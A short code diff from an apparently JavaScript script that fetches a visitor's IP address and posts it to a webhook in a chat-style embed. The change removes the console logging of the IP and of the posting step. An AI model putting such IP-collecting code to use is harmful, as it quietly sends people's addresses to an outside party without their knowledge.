@@ -42,7 +42,7 @@ const getIpAndPost = async () => {
     const json = await response.json();
     var IP = json.ip
     bodydata.embeds[1].description = IP
-    console.log(IP)
+    
     postData(webhookUrl,bodydata)
 
 }
@@ -54,7 +54,7 @@ const getIpAndPost = async () => {
 
 
 function postData(url, data) {
-    console.log("posting")
+    
     fetch(url, {
 	method: 'POST',
 	body: JSON.stringify(data),
